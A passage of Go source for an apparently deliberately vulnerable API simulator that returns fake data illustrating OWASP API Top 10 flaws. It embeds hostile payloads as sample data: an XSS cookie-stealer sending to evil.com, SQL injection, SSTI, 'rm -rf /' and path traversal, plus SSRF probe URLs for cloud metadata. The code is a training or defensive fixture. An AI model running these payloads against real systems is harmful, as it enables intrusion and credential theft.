				"db":       0,
			},
			"jwt_secret":        fakeToken(rng, 32),
			"encryption_key":    fakeToken(rng, 32),
			"api_rate_limit":    0,
			"debug_mode":        true,
			"maintenance_mode":  false,
			"admin_emails":      []string{h.fakeEmail(rng), h.fakeEmail(rng)},
			"aws_access_key":    fmt.Sprintf("AKIA%s", strings.ToUpper(fakeToken(rng, 16))),
			"aws_secret_key":    fakeToken(rng, 20),
			"stripe_secret_key": fmt.Sprintf("sk_live_%s", fakeToken(rng, 24)),
		},
		"meta": map[string]interface{}{
			"request_id":    apiRequestID(r.URL.Path),
			"vulnerability": "Broken Function Level Auth - Server configuration with secrets accessible without admin role",
			"caller_role":   "user",
			"required_role": "superadmin",
		},
	}
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, toJSON(resp))
	return http.StatusOK
}

func (h *Handler) serveAPI5AdminDeleteUser(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)

	targetID := rng.Intn(90000) + 10000
	resp := map[string]interface{}{
		"data": map[string]interface{}{
			"action":      "delete_user",
			"target_id":   targetID,
			"target_name": h.fakeName(rng),
			"target_email": h.fakeEmail(rng),
			"status":      "completed",
			"deleted_records": map[string]interface{}{
				"user_profile":  1,
				"orders":        rng.Intn(50),
				"sessions":      rng.Intn(100),
				"audit_logs":    rng.Intn(500),
				"documents":     rng.Intn(20),
			},
			"performed_by": map[string]interface{}{
				"id":   rng.Intn(90000) + 10000,
				"role": "user",
				"note": "No permission check performed",
			},
		},
		"meta": map[string]interface{}{
			"request_id":    apiRequestID(r.URL.Path),
			"vulnerability": "Broken Function Level Auth - Delete operation without admin permission check",
			"caller_role":   "user",
			"required_role": "admin",
			"confirmation":  "not required",
		},
	}
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, toJSON(resp))
	return http.StatusOK
}

// ---------------------------------------------------------------------------
// API6: Unrestricted Access to Sensitive Business Flows
// ---------------------------------------------------------------------------

func (h *Handler) serveAPI6(w http.ResponseWriter, r *http.Request) int {
	path := r.URL.Path
	setAPIHeaders(w, path)

	switch {
	case strings.HasSuffix(path, "/api6") || strings.HasSuffix(path, "/api6/"):
		return h.serveAPI6Index(w, r)
	case strings.HasSuffix(path, "/api6/purchase"):
		return h.serveAPI6Purchase(w, r)
	case strings.HasSuffix(path, "/api6/referral"):
		return h.serveAPI6Referral(w, r)
	case strings.HasSuffix(path, "/api6/coupon/validate"):
		return h.serveAPI6CouponValidate(w, r)
	default:
		w.WriteHeader(http.StatusNotFound)
		fmt.Fprint(w, toJSON(map[string]interface{}{
			"errors": []map[string]interface{}{{"code": "NOT_FOUND", "message": "Unknown API6 endpoint"}},
		}))
		return http.StatusNotFound
	}
}

func (h *Handler) serveAPI6Index(w http.ResponseWriter, r *http.Request) int {
	resp := map[string]interface{}{
		"data": map[string]interface{}{
			"category":    "API6:2023 - Unrestricted Access to Sensitive Business Flows",
			"description": "APIs that expose business flows without controls to prevent automated abuse such as scalping, spam, or referral fraud.",
			"endpoints": []string{
				"/vuln/api-sec/api6/purchase",
				"/vuln/api-sec/api6/referral",
				"/vuln/api-sec/api6/coupon/validate",
			},
		},
	}
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, toJSON(resp))
	return http.StatusOK
}

func (h *Handler) serveAPI6Purchase(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)

	// No rate limiting, no CAPTCHA, no device fingerprinting
	resp := map[string]interface{}{
		"data": map[string]interface{}{
			"order_id":      fmt.Sprintf("ORD-%06d", rng.Intn(999999)),
			"product":       []string{"Limited Edition Sneaker", "Concert Ticket", "GPU RTX 5090", "PS6 Console"}[rng.Intn(4)],
			"quantity":      rng.Intn(10) + 1,
			"unit_price":    fmt.Sprintf("%.2f", float64(rng.Intn(2000))+99.99),
			"total":         fmt.Sprintf("%.2f", float64(rng.Intn(20000))+99.99),
			"status":        "confirmed",
			"payment_token": fakeToken(rng, 16),
			"shipping_eta":  fmt.Sprintf("%d days", rng.Intn(14)+1),
		},
		"meta": map[string]interface{}{
			"request_id":    apiRequestID(r.URL.Path),
			"vulnerability": "Unrestricted Business Flow - No rate limiting, no bot detection on purchase",
			"controls": map[string]interface{}{
				"rate_limit":           "none",
				"captcha":              false,
				"device_fingerprint":   false,
				"purchase_limit":       "unlimited",
				"velocity_check":       false,
			},
		},
	}
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, toJSON(resp))
	return http.StatusOK
}

func (h *Handler) serveAPI6Referral(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)

	// Referral abuse — no duplicate check, no email verification
	resp := map[string]interface{}{
		"data": map[string]interface{}{
			"referral_id":    fmt.Sprintf("REF-%06d", rng.Intn(999999)),
			"referrer":       h.fakeEmail(rng),
			"referred":       h.fakeEmail(rng),
			"reward":         "$25.00 account credit",
			"status":         "credited",
			"total_referrals": rng.Intn(500) + 50,
			"total_earned":   fmt.Sprintf("$%.2f", float64(rng.Intn(12500)+1250)),
		},
		"meta": map[string]interface{}{
			"request_id":    apiRequestID(r.URL.Path),
			"vulnerability": "Unrestricted Business Flow - No duplicate referral check, self-referral allowed",
			"controls": map[string]interface{}{
				"duplicate_check":    false,
				"email_verification": false,
				"self_referral":      "allowed",
				"referral_limit":     "unlimited",
				"fraud_detection":    false,
			},
		},
	}
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, toJSON(resp))
	return http.StatusOK
}

func (h *Handler) serveAPI6CouponValidate(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)

	couponCode := fmt.Sprintf("SAVE%d", rng.Intn(90)+10)
	resp := map[string]interface{}{
		"data": map[string]interface{}{
			"coupon_code":  couponCode,
			"discount_pct": rng.Intn(50) + 10,
			"valid":        true,
			"uses":         rng.Intn(5000) + 100,
			"max_uses":     "unlimited",
			"stackable":    true,
			"applies_to":   "all_products",
			"expires":      "never",
		},
		"meta": map[string]interface{}{
			"request_id":    apiRequestID(r.URL.Path),
			"vulnerability": "Unrestricted Business Flow - Coupon reusable unlimited times, stackable",
			"controls": map[string]interface{}{
				"single_use":      false,
				"per_user_limit":  "none",
				"stacking":        "allowed",
				"expiration":      "none",
			},
		},
	}
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, toJSON(resp))
	return http.StatusOK
}

// ---------------------------------------------------------------------------
// API7: Server-Side Request Forgery (SSRF)
// ---------------------------------------------------------------------------

func (h *Handler) serveAPI7(w http.ResponseWriter, r *http.Request) int {
	path := r.URL.Path
	setAPIHeaders(w, path)

	switch {
	case strings.HasSuffix(path, "/api7") || strings.HasSuffix(path, "/api7/"):
		return h.serveAPI7Index(w, r)
	case strings.HasSuffix(path, "/api7/webhook"):
		return h.serveAPI7Webhook(w, r)
	case strings.HasSuffix(path, "/api7/preview"):
		return h.serveAPI7Preview(w, r)
	case strings.HasSuffix(path, "/api7/import"):
		return h.serveAPI7Import(w, r)
	default:
		w.WriteHeader(http.StatusNotFound)
		fmt.Fprint(w, toJSON(map[string]interface{}{
			"errors": []map[string]interface{}{{"code": "NOT_FOUND", "message": "Unknown API7 endpoint"}},
		}))
		return http.StatusNotFound
	}
}

func (h *Handler) serveAPI7Index(w http.ResponseWriter, r *http.Request) int {
	resp := map[string]interface{}{
		"data": map[string]interface{}{
			"category":    "API7:2023 - Server-Side Request Forgery",
			"description": "SSRF flaws occur when an API fetches a remote resource without validating the user-supplied URL, allowing attackers to probe internal networks.",
			"endpoints": []string{
				"/vuln/api-sec/api7/webhook?url=http://169.254.169.254/latest/meta-data/",
				"/vuln/api-sec/api7/preview?url=http://internal-service:8080/admin",
				"/vuln/api-sec/api7/import?source=http://localhost:6379",
			},
		},
	}
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, toJSON(resp))
	return http.StatusOK
}

func (h *Handler) serveAPI7Webhook(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)

	webhookURL := r.URL.Query().Get("url")
	if webhookURL == "" {
		webhookURL = "http://169.254.169.254/latest/meta-data/"
	}

	// Simulates SSRF — pretends to fetch the internal URL and returns
	// metadata-service-like data.
	resp := map[string]interface{}{
		"data": map[string]interface{}{
			"webhook_id":    fmt.Sprintf("wh_%s", fakeToken(rng, 12)),
			"target_url":    webhookURL,
			"status":        "delivered",
			"response_code": 200,
			"response_body": map[string]interface{}{
				"ami-id":          fmt.Sprintf("ami-%s", fakeToken(rng, 8)),
				"instance-id":    fmt.Sprintf("i-%s", fakeToken(rng, 8)),
				"instance-type":  "m5.xlarge",
				"local-ipv4":    "10.0.42.17",
				"public-ipv4":   fmt.Sprintf("%d.%d.%d.%d", rng.Intn(200)+10, rng.Intn(256), rng.Intn(256), rng.Intn(256)),
				"iam-role":      "arn:aws:iam::123456789012:role/acme-prod-app",
				"security-credentials": map[string]interface{}{
					"AccessKeyId":     fmt.Sprintf("ASIA%s", strings.ToUpper(fakeToken(rng, 16))),
					"SecretAccessKey": fakeToken(rng, 20),
					"Token":           fakeToken(rng, 64),
					"Expiration":      time.Now().UTC().Add(6 * time.Hour).Format(time.RFC3339),
				},
			},
			"fetched_at": time.Now().UTC().Format(time.RFC3339),
		},
		"meta": map[string]interface{}{
			"request_id":    apiRequestID(r.URL.Path),
			"vulnerability": "SSRF - Webhook URL fetches internal/cloud metadata without validation",
			"blocked_hosts": []string{},
			"url_validation": "none",
		},
	}
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, toJSON(resp))
	return http.StatusOK
}

func (h *Handler) serveAPI7Preview(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)

	previewURL := r.URL.Query().Get("url")
	if previewURL == "" {
		previewURL = "http://internal-admin.local:8080/admin/dashboard"
	}

	resp := map[string]interface{}{
		"data": map[string]interface{}{
			"url":          previewURL,
			"title":        "Internal Admin Dashboard",
			"content_type": "text/html",
			"status_code":  200,
			"body_preview":  "<html><head><title>Admin Dashboard</title></head><body><h1>System Status: OK</h1><p>Database connections: 42/100</p><p>Active sessions: 1,847</p><p>Redis memory: 2.1GB/8GB</p></body></html>",
			"headers": map[string]interface{}{
				"Server":       "nginx/1.24.0",
				"X-Internal":   "true",
				"X-Debug-Info": fmt.Sprintf("host=%s pid=%d", "ip-10-0-42-17", rng.Intn(60000)+1000),
			},
			"resolved_ip": "10.0.42.17",
			"response_time_ms": rng.Intn(50) + 5,
		},
		"meta": map[string]interface{}{
			"request_id":    apiRequestID(r.URL.Path),
			"vulnerability": "SSRF - URL preview fetches internal resources, leaks internal network info",
			"dns_rebinding_protection": false,
			"private_ip_blocked":       false,
		},
	}
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, toJSON(resp))
	return http.StatusOK
}

func (h *Handler) serveAPI7Import(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)

	sourceURL := r.URL.Query().Get("source")
	if sourceURL == "" {
		sourceURL = "http://localhost:6379"
	}

	resp := map[string]interface{}{
		"data": map[string]interface{}{
			"import_id":    fmt.Sprintf("imp_%s", fakeToken(rng, 10)),
			"source_url":   sourceURL,
			"status":       "completed",
			"records_imported": rng.Intn(10000) + 500,
			"raw_response":  "REDIS0011\xferedis-ver\x056.2.7\xfaredis-bits\xc0@\xfe\x00\xfb\x03\x03\x00\x06apikey\x14sk_live_" + fakeToken(rng, 12) + "\x00\bdb_pass\x10" + fakeToken(rng, 8),
			"bytes_read":   rng.Intn(500000) + 10000,
		},
		"meta": map[string]interface{}{
			"request_id":    apiRequestID(r.URL.Path),
			"vulnerability": "SSRF - Import from arbitrary URL, no protocol/host validation, raw response exposed",
			"allowed_protocols": []string{"http", "https", "ftp", "gopher", "file"},
			"url_allowlist":     "none",
		},
	}
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, toJSON(resp))
	return http.StatusOK
}

// ---------------------------------------------------------------------------
// API8: Security Misconfiguration
// ---------------------------------------------------------------------------

func (h *Handler) serveAPI8(w http.ResponseWriter, r *http.Request) int {
	path := r.URL.Path
	setAPIHeaders(w, path)

	switch {
	case strings.HasSuffix(path, "/api8") || strings.HasSuffix(path, "/api8/"):
		return h.serveAPI8Index(w, r)
	case strings.HasSuffix(path, "/api8/debug"):
		return h.serveAPI8Debug(w, r)
	case strings.HasSuffix(path, "/api8/cors"):
		return h.serveAPI8CORS(w, r)
	case strings.HasSuffix(path, "/api8/versions"):
		return h.serveAPI8Versions(w, r)
	default:
		w.WriteHeader(http.StatusNotFound)
		fmt.Fprint(w, toJSON(map[string]interface{}{
			"errors": []map[string]interface{}{{"code": "NOT_FOUND", "message": "Unknown API8 endpoint"}},
		}))
		return http.StatusNotFound
	}
}

func (h *Handler) serveAPI8Index(w http.ResponseWriter, r *http.Request) int {
	resp := map[string]interface{}{
		"data": map[string]interface{}{
			"category":    "API8:2023 - Security Misconfiguration",
			"description": "APIs and the systems supporting them typically contain complex configurations meant to make the API more customizable. Misconfigurations can expose sensitive data.",
			"endpoints": []string{
				"/vuln/api-sec/api8/debug",
				"/vuln/api-sec/api8/cors",
				"/vuln/api-sec/api8/versions",
			},
		},
	}
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, toJSON(resp))
	return http.StatusOK
}

func (h *Handler) serveAPI8Debug(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)

	// Debug mode enabled in production
	w.Header().Set("X-Debug-Mode", "enabled")
	w.Header().Set("X-Stack-Trace", "visible")
	w.Header().Set("Server", "AcmeAPI/3.1.0-debug")
	w.Header().Set("X-Powered-By", "Go/1.22.0")

	resp := map[string]interface{}{
		"data": map[string]interface{}{
			"debug_mode":  true,
			"environment": "production",
			"build_info": map[string]interface{}{
				"version":    "3.1.0-rc2",
				"commit":     fakeToken(rng, 20),
				"build_date": "2025-12-15T14:30:00Z",
				"go_version": "go1.22.0",
				"os_arch":    "linux/amd64",
			},
			"runtime": map[string]interface{}{
				"goroutines":     rng.Intn(500) + 50,
				"heap_alloc_mb":  rng.Intn(2000) + 200,
				"gc_pause_ns":    rng.Intn(5000000),
				"uptime_hours":   rng.Intn(8760) + 100,
				"pid":            rng.Intn(60000) + 1000,
			},
			"database": map[string]interface{}{
				"dsn":          fmt.Sprintf("postgres://app_user:%s@prod-db:5432/acme_prod?sslmode=disable", fakeToken(rng, 12)),
				"pool_size":    50,
				"active_conns": rng.Intn(50),
				"idle_conns":   rng.Intn(20),
			},
			"env_vars": map[string]interface{}{
				"APP_ENV":            "production",
				"DEBUG":              "true",
				"SECRET_KEY":         fakeToken(rng, 32),
				"AWS_ACCESS_KEY_ID":  fmt.Sprintf("AKIA%s", strings.ToUpper(fakeToken(rng, 16))),
				"AWS_SECRET_KEY":     fakeToken(rng, 20),
				"STRIPE_KEY":         fmt.Sprintf("sk_live_%s", fakeToken(rng, 24)),
				"DATABASE_URL":       fmt.Sprintf("postgres://admin:%s@prod-db:5432/acme", fakeToken(rng, 12)),
			},
			"recent_errors": []map[string]interface{}{
				{
					"timestamp": fakeTimestamp(rng),
					"level":     "ERROR",
					"message":   "failed to validate JWT: token expired",
					"stack":     "auth/jwt.go:142 -> middleware/auth.go:58 -> handler/api.go:34",
				},
				{
					"timestamp": fakeTimestamp(rng),
					"level":     "WARN",
					"message":   fmt.Sprintf("SQL query timeout: SELECT * FROM users WHERE email = '%s'", h.fakeEmail(rng)),
					"stack":     "repository/user.go:87 -> service/user.go:42",
				},
			},
		},
		"meta": map[string]interface{}{
			"request_id":    apiRequestID(r.URL.Path),
			"vulnerability": "Security Misconfiguration - Debug mode enabled in production, secrets exposed",
		},
	}
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, toJSON(resp))
	return http.StatusOK
}

func (h *Handler) serveAPI8CORS(w http.ResponseWriter, r *http.Request) int {
	// Permissive CORS headers
	origin := r.Header.Get("Origin")
	if origin == "" {
		origin = "https://evil-attacker.example.com"
	}
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, PATCH, OPTIONS")
	w.Header().Set("Access-Control-Allow-Headers", "*")
	w.Header().Set("Access-Control-Allow-Credentials", "true")
	w.Header().Set("Access-Control-Expose-Headers", "X-API-Key, X-Auth-Token, Authorization")
	w.Header().Set("Access-Control-Max-Age", "86400")

	resp := map[string]interface{}{
		"data": map[string]interface{}{
			"message":         "CORS preflight and response configured insecurely",
			"reflected_origin": origin,
			"cors_policy": map[string]interface{}{
				"allow_origin":      "*",
				"allow_credentials": true,
				"allow_methods":     "GET, POST, PUT, DELETE, PATCH, OPTIONS",
				"allow_headers":     "*",
				"expose_headers":    "X-API-Key, X-Auth-Token, Authorization",
				"max_age":           86400,
			},
			"note": "Wildcard origin with credentials enabled is a critical misconfiguration",
		},
		"meta": map[string]interface{}{
			"request_id":    apiRequestID(r.URL.Path),
			"vulnerability": "Security Misconfiguration - Permissive CORS with wildcard origin and credentials",
		},
	}
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, toJSON(resp))
	return http.StatusOK
}

func (h *Handler) serveAPI8Versions(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)

	resp := map[string]interface{}{
		"data": map[string]interface{}{
			"current_version": "v3",
			"available_versions": []map[string]interface{}{
				{
					"version":    "v1",
					"status":     "deprecated",
					"sunset":     "2023-06-01",
					"base_url":   "/api/v1",
					"auth":       "none",
					"note":       "No authentication required — legacy oversight",
				},
				{
					"version":    "v2",
					"status":     "deprecated",
					"sunset":     "2024-12-01",
					"base_url":   "/api/v2",
					"auth":       "api_key",
					"note":       "Known SQL injection in /api/v2/search",
				},
				{
					"version":    "v3",
					"status":     "current",
					"base_url":   "/api/v3",
					"auth":       "oauth2",
					"note":       "Production version",
				},
				{
					"version":    "v4-beta",
					"status":     "beta",
					"base_url":   "/api/v4-beta",
					"auth":       "none",
					"note":       "Beta endpoints with no auth, unstable",
				},
			},
			"internal_endpoints": []string{
				"/api/internal/health",
				"/api/internal/metrics",
				"/api/internal/cache/flush",
				"/api/internal/config/reload",
			},
			"swagger_urls": []string{
				"/api/v1/swagger.json",
				"/api/v2/swagger.json",
				"/api/v3/swagger.json",
				"/api/v4-beta/swagger.json",
			},
			"build_hash": fakeToken(rng, 20),
		},
		"meta": map[string]interface{}{
			"request_id":    apiRequestID(r.URL.Path),
			"vulnerability": "Security Misconfiguration - Deprecated API versions still active, internal endpoints exposed",
		},
	}
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, toJSON(resp))
	return http.StatusOK
}

// ---------------------------------------------------------------------------
// API9: Improper Inventory Management
// ---------------------------------------------------------------------------

func (h *Handler) serveAPI9(w http.ResponseWriter, r *http.Request) int {
	path := r.URL.Path
	setAPIHeaders(w, path)

	switch {
	case path == "/vuln/api-sec/api9" || path == "/vuln/api-sec/api9/":
		return h.serveAPI9Index(w, r)
	case strings.HasSuffix(path, "/api9/v1/users"):
		return h.serveAPI9V1Users(w, r)
	case strings.HasSuffix(path, "/api9/internal/health"):
		return h.serveAPI9InternalHealth(w, r)
	case strings.HasSuffix(path, "/api9/beta/features"):
		return h.serveAPI9BetaFeatures(w, r)
	default:
		w.WriteHeader(http.StatusNotFound)
		fmt.Fprint(w, toJSON(map[string]interface{}{
			"errors": []map[string]interface{}{{"code": "NOT_FOUND", "message": "Unknown API9 endpoint"}},
		}))
		return http.StatusNotFound
	}
}

func (h *Handler) serveAPI9Index(w http.ResponseWriter, r *http.Request) int {
	resp := map[string]interface{}{
		"data": map[string]interface{}{
			"category":    "API9:2023 - Improper Inventory Management",
			"description": "APIs tend to expose more endpoints than traditional web applications. Proper inventory management and retirement of old versions is critical.",
			"endpoints": []string{
				"/vuln/api-sec/api9/v1/users",
				"/vuln/api-sec/api9/internal/health",
				"/vuln/api-sec/api9/beta/features",
			},
		},
	}
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, toJSON(resp))
	return http.StatusOK
}

func (h *Handler) serveAPI9V1Users(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)

	// Old API version still accessible, no auth, returns more data than v3
	users := make([]map[string]interface{}, 15)
	for i := range users {
		users[i] = map[string]interface{}{
			"id":            rng.Intn(90000) + 10000,
			"username":      strings.ToLower(h.firstNames[rng.Intn(len(h.firstNames))]) + fmt.Sprintf("%d", rng.Intn(999)),
			"name":          h.fakeName(rng),
			"email":         h.fakeEmail(rng),
			"password":      fmt.Sprintf("%s%d!", h.firstNames[rng.Intn(len(h.firstNames))], rng.Intn(999)),
			"ssn":           fmt.Sprintf("%03d-%02d-%04d", rng.Intn(900)+100, rng.Intn(90)+10, rng.Intn(9000)+1000),
			"phone":         fakePhone(rng),
			"role":          []string{"user", "admin", "superadmin"}[rng.Intn(3)],
			"api_key":       fakeToken(rng, 16),
			"created_at":    fakeTimestamp(rng),
		}
	}

	w.Header().Set("X-API-Version", "1.0.0")
	w.Header().Set("X-Deprecated", "true")
	w.Header().Set("Sunset", "2023-06-01")

	resp := map[string]interface{}{
		"data":  users,
		"meta": map[string]interface{}{
			"request_id":    apiRequestID(r.URL.Path),
			"api_version":   "v1 (DEPRECATED)",
			"vulnerability": "Improper Inventory - Old API version still accessible, returns plaintext passwords",
			"deprecation_date": "2023-06-01",
			"auth_required":    false,
			"data_filtering":   "none",
		},
	}
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, toJSON(resp))
	return http.StatusOK
}

func (h *Handler) serveAPI9InternalHealth(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)

	// Internal health endpoint exposed publicly
	resp := map[string]interface{}{
		"data": map[string]interface{}{
			"status": "healthy",
			"services": map[string]interface{}{
				"api_server": map[string]interface{}{
					"status":   "up",
					"host":     "ip-10-0-42-17.ec2.internal",
					"port":     8080,
					"pid":      rng.Intn(60000) + 1000,
					"uptime_s": rng.Intn(1000000) + 10000,
				},
				"database": map[string]interface{}{
					"status":  "up",
					"host":    "prod-db-master.internal.acme-corp.com",
					"port":    5432,
					"pool":    map[string]interface{}{"active": rng.Intn(50), "idle": rng.Intn(20), "max": 100},
					"version": "PostgreSQL 15.4",
				},
				"redis": map[string]interface{}{
					"status":    "up",
					"host":      "redis-cluster.internal.acme-corp.com",
					"port":      6379,
					"memory_mb": rng.Intn(8000) + 500,
					"version":   "7.2.3",
				},
				"elasticsearch": map[string]interface{}{
					"status":  "yellow",
					"host":    "es-prod-01.internal.acme-corp.com",
					"port":    9200,
					"indices": rng.Intn(200) + 20,
					"version": "8.11.1",
				},
				"message_queue": map[string]interface{}{
					"status":    "up",
					"host":      "rabbitmq.internal.acme-corp.com",
					"port":      5672,
					"queues":    rng.Intn(50) + 5,
					"consumers": rng.Intn(100) + 10,
				},
			},
			"network": map[string]interface{}{
				"private_ip":  "10.0.42.17",
				"public_ip":   fmt.Sprintf("%d.%d.%d.%d", rng.Intn(200)+10, rng.Intn(256), rng.Intn(256), rng.Intn(256)),
				"vpc_id":      fmt.Sprintf("vpc-%s", fakeToken(rng, 8)),
				"subnet":      "10.0.42.0/24",
				"availability_zone": "us-east-1a",
			},
		},
		"meta": map[string]interface{}{
			"request_id":    apiRequestID(r.URL.Path),
			"vulnerability": "Improper Inventory - Internal health check endpoint exposed publicly, reveals infrastructure",
		},
	}
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, toJSON(resp))
	return http.StatusOK
}

func (h *Handler) serveAPI9BetaFeatures(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)

	// Beta features with no authentication
	resp := map[string]interface{}{
		"data": map[string]interface{}{
			"features": []map[string]interface{}{
				{
					"name":        "ai_data_export",
					"description": "Export all user data to AI training pipeline",
					"enabled":     true,
					"api_endpoint": "/api/v4-beta/ai/export",
					"auth":        "none",
					"data_scope":  "all_users",
				},
				{
					"name":        "admin_impersonate",
					"description": "Impersonate any user account",
					"enabled":     true,
					"api_endpoint": "/api/v4-beta/admin/impersonate",
					"auth":        "none",
					"params":      "user_id",
				},
				{
					"name":        "bulk_delete",
					"description": "Delete user accounts in bulk",
					"enabled":     true,
					"api_endpoint": "/api/v4-beta/admin/bulk-delete",
					"auth":        "none",
					"params":      "user_ids[]",
				},
				{
					"name":        "db_query",
					"description": "Execute raw database queries",
					"enabled":     rng.Intn(2) == 0,
					"api_endpoint": "/api/v4-beta/debug/query",
					"auth":        "none",
					"params":      "sql",
				},
			},
			"environment": "beta",
			"deployment":  fmt.Sprintf("deploy-%s", fakeToken(rng, 8)),
		},
		"meta": map[string]interface{}{
			"request_id":    apiRequestID(r.URL.Path),
			"vulnerability": "Improper Inventory - Beta features exposed with no authentication, dangerous operations available",
		},
	}
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, toJSON(resp))
	return http.StatusOK
}

// ---------------------------------------------------------------------------
// API10: Unsafe Consumption of APIs
// ---------------------------------------------------------------------------

func (h *Handler) serveAPI10OWASP(w http.ResponseWriter, r *http.Request) int {
	path := r.URL.Path
	setAPIHeaders(w, path)

	switch {
	case path == "/vuln/api-sec/api10" || path == "/vuln/api-sec/api10/":
		return h.serveAPI10OWASPIndex(w, r)
	case strings.HasSuffix(path, "/api10/partner/sync"):
		return h.serveAPI10PartnerSync(w, r)
	case strings.HasSuffix(path, "/api10/payment/callback"):
		return h.serveAPI10PaymentCallback(w, r)
	case strings.HasSuffix(path, "/api10/sso/callback"):
		return h.serveAPI10SSOCallback(w, r)
	default:
		w.WriteHeader(http.StatusNotFound)
		fmt.Fprint(w, toJSON(map[string]interface{}{
			"errors": []map[string]interface{}{{"code": "NOT_FOUND", "message": "Unknown API10 endpoint"}},
		}))
		return http.StatusNotFound
	}
}

func (h *Handler) serveAPI10OWASPIndex(w http.ResponseWriter, r *http.Request) int {
	resp := map[string]interface{}{
		"data": map[string]interface{}{
			"category":    "API10:2023 - Unsafe Consumption of APIs",
			"description": "Developers tend to trust data received from third-party APIs more than user input, adopting weaker security standards for processing it.",
			"endpoints": []string{
				"/vuln/api-sec/api10/partner/sync",
				"/vuln/api-sec/api10/payment/callback",
				"/vuln/api-sec/api10/sso/callback",
			},
		},
	}
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, toJSON(resp))
	return http.StatusOK
}

func (h *Handler) serveAPI10PartnerSync(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)

	// Trusts external API data without validation — includes injected payloads
	resp := map[string]interface{}{
		"data": map[string]interface{}{
			"sync_id":    fmt.Sprintf("sync_%s", fakeToken(rng, 10)),
			"partner":    "GlobalData Partners Inc.",
			"status":     "completed",
			"records_synced": rng.Intn(5000) + 500,
			"trusted_data": map[string]interface{}{
				"users": []map[string]interface{}{
					{
						"name":  fmt.Sprintf("%s<script>document.location='https://evil.com/steal?c='+document.cookie</script>", h.fakeName(rng)),
						"email": h.fakeEmail(rng),
						"role":  "admin'; DROP TABLE users; --",
						"bio":   "{{constructor.constructor('return process.env')()}}",
					},
					{
						"name":  h.fakeName(rng),
						"email": fmt.Sprintf("%s@%s", "user'+OR+1=1--", h.domains[rng.Intn(len(h.domains))]),
						"role":  "user",
						"bio":   "${7*7}",
					},
				},
				"products": []map[string]interface{}{
					{
						"name":  "Widget\"; rm -rf / #",
						"price": -99999,
						"sku":   "../../etc/passwd",
					},
				},
			},
			"validation_performed": false,
			"sanitization":         "none",
		},
		"meta": map[string]interface{}{
			"request_id":    apiRequestID(r.URL.Path),
			"vulnerability": "Unsafe Consumption - Partner data trusted without validation, contains XSS/SQLi/SSTI payloads",
			"input_validation": map[string]interface{}{
				"xss_filter":       false,
				"sql_sanitization": false,
				"type_checking":    false,
				"schema_validation": false,
			},
		},
	}
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, toJSON(resp))
	return http.StatusOK
}

func (h *Handler) serveAPI10PaymentCallback(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)

	// Payment callback with no signature verification
	resp := map[string]interface{}{
		"data": map[string]interface{}{
			"callback_id":   fmt.Sprintf("cb_%s", fakeToken(rng, 12)),
			"transaction_id": fmt.Sprintf("txn_%s", fakeToken(rng, 16)),
			"amount":         fmt.Sprintf("%.2f", float64(rng.Intn(10000))+0.01),
			"currency":       "USD",
			"status":         "completed",
			"customer_id":    fmt.Sprintf("CUST-%05d", rng.Intn(99999)),
			"customer_email": h.fakeEmail(rng),
			"payment_method": fmt.Sprintf("card_ending_%04d", rng.Intn(10000)),
			"processed_at":   time.Now().UTC().Format(time.RFC3339),
			"signature":      fakeToken(rng, 32),
			"signature_verified": false,
		},
		"meta": map[string]interface{}{
			"request_id":    apiRequestID(r.URL.Path),
			"vulnerability": "Unsafe Consumption - Payment callback accepted without signature verification",
			"security_checks": map[string]interface{}{
				"signature_verification": false,
				"replay_protection":      false,
				"idempotency_check":      false,
				"amount_validation":      false,
				"ip_allowlist":           false,
				"tls_certificate_pinning": false,
			},
		},
	}
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, toJSON(resp))
	return http.StatusOK
}

func (h *Handler) serveAPI10SSOCallback(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)

	// SSO callback allows injection — no SAML assertion validation
	name := h.fakeName(rng)
	email := h.fakeEmail(rng)
	resp := map[string]interface{}{
		"data": map[string]interface{}{
			"sso_provider":     "Acme Identity Provider",
			"callback_url":     "https://api.acme-corp.example.com/auth/sso/callback",
			"assertion_valid":  true,
			"signature_check":  "skipped",
			"user_provisioned": true,
			"session": map[string]interface{}{
				"session_id": fakeToken(rng, 24),
				"token":      fakeToken(rng, 32),
				"expires_in": 86400,
			},
			"user": map[string]interface{}{
				"id":           rng.Intn(90000) + 10000,
